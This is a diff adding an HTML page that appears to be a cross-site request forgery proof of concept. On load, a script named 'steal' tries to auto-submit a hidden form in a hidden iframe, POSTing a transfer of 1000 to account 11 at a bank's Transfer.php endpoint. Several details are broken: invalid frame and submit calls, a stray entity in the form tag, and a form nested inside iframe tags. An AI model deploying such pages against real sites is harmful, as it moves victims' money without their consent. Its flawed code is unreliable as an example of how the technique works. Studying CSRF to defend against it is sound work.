@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>Document</title>
+  <script type="text/javascript">
+    function steal() {
+      console.log(document.frames)
+      iframe = document.frames["steal"];
+      iframe.document.Submit("transfer");
+    }
+  </script>
+</head>
+<body onload="steal()">
+  <iframe name="steal" display="none">
+    <form method="POST" name="transfer" &emsp;action="http://www.myBank.com/Transfer.php">
+      <input type="hidden" name="toBankId" value="11">
+      <input type="hidden" name="money" value="1000">
+    </form>
+  </iframe>
+  
+
+</body>
+
+
+</html>
